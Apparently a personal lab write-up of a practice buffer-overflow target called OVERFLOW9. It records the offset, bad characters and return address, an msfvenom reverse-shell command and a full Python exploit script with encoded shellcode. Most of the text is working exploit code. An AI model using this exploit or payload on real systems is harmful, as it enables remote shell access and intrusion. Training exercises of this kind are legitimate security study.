## fuzzing

![[Pasted image 20210530155826.png]]

## offset 

EIP: 35794234

offset: 1514

![[Pasted image 20210530160054.png]]

## bad chars

ESP: 017FFA30

bad chars: 	`\x00\x04\x3e\xe1`

![[Pasted image 20210530160324.png]]

## jmp point

`625011AF`

little endian: 	`\xaf\x11\x50\x62`

## exploit

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x04\x3e\xe1"`

here the rev connection is made but no shell so it might be due to a char which is hidden due to the preceding one.

re-checking 

## bad char - re check

remove the bad chars from our list (python script)
and create a new byte array
`!mona bytearray -b "\x00\x04\x3e\xe1"`

![[Pasted image 20210530161806.png]]

ESP:  019EFA30

and checking we got another bad char 

![[Pasted image 20210530162030.png]]

bad chars: `\x00\x04\x3e\x3f\xe1`

## jmp - re

`625011AF`

little endian: 	`\xaf\x11\x50\x62`

## exploit - re

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x04\x3e\x3f\xe1"`

and this time we successfully got the proper shell

![[Pasted image 20210530162427.png]]

```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW9 "
offset = 1514
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\xba\xc4\xc5\xd3\x40\xda\xde\xd9\x74\x24\xf4\x5d\x2b\xc9\xb1"
"\x52\x83\xed\xfc\x31\x55\x0e\x03\x91\xcb\x31\xb5\xe5\x3c\x37"
"\x36\x15\xbd\x58\xbe\xf0\x8c\x58\xa4\x71\xbe\x68\xae\xd7\x33"
"\x02\xe2\xc3\xc0\x66\x2b\xe4\x61\xcc\x0d\xcb\x72\x7d\x6d\x4a"
"\xf1\x7c\xa2\xac\xc8\x4e\xb7\xad\x0d\xb2\x3a\xff\xc6\xb8\xe9"
"\xef\x63\xf4\x31\x84\x38\x18\x32\x79\x88\x1b\x13\x2c\x82\x45"
"\xb3\xcf\x47\xfe\xfa\xd7\x84\x3b\xb4\x6c\x7e\xb7\x47\xa4\x4e"
"\x38\xeb\x89\x7e\xcb\xf5\xce\xb9\x34\x80\x26\xba\xc9\x93\xfd"
"\xc0\x15\x11\xe5\x63\xdd\x81\xc1\x92\x32\x57\x82\x99\xff\x13"
"\xcc\xbd\xfe\xf0\x67\xb9\x8b\xf6\xa7\x4b\xcf\xdc\x63\x17\x8b"
"\x7d\x32\xfd\x7a\x81\x24\x5e\x22\x27\x2f\x73\x37\x5a\x72\x1c"
"\xf4\x57\x8c\xdc\x92\xe0\xff\xee\x3d\x5b\x97\x42\xb5\x45\x60"
"\xa4\xec\x32\xfe\x5b\x0f\x43\xd7\x9f\x5b\x13\x4f\x09\xe4\xf8"
"\x8f\xb6\x31\xae\xdf\x18\xea\x0f\x8f\xd8\x5a\xf8\xc5\xd6\x85"
"\x18\xe6\x3c\xae\xb3\x1d\xd7\xdb\x52\x19\xf7\xb4\x56\x21\xd4"
"\x6d\xde\xc7\x70\x7e\xb6\x50\xed\xe7\x93\x2a\x8c\xe8\x09\x57"
"\x8e\x63\xbe\xa8\x41\x84\xcb\xba\x36\x64\x86\xe0\x91\x7b\x3c"
"\x8c\x7e\xe9\xdb\x4c\x08\x12\x74\x1b\x5d\xe4\x8d\xc9\x73\x5f"
"\x24\xef\x89\x39\x0f\xab\x55\xfa\x8e\x32\x1b\x46\xb5\x24\xe5"
"\x47\xf1\x10\xb9\x11\xaf\xce\x7f\xc8\x01\xb8\x29\xa7\xcb\x2c"
"\xaf\x8b\xcb\x2a\xb0\xc1\xbd\xd2\x01\xbc\xfb\xed\xae\x28\x0c"
"\x96\xd2\xc8\xf3\x4d\x57\xe8\x11\x47\xa2\x81\x8f\x02\x0f\xcc"
"\x2f\xf9\x4c\xe9\xb3\x0b\x2d\x0e\xab\x7e\x28\x4a\x6b\x93\x40"
"\xc3\x1e\x93\xf7\xe4\x0a"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```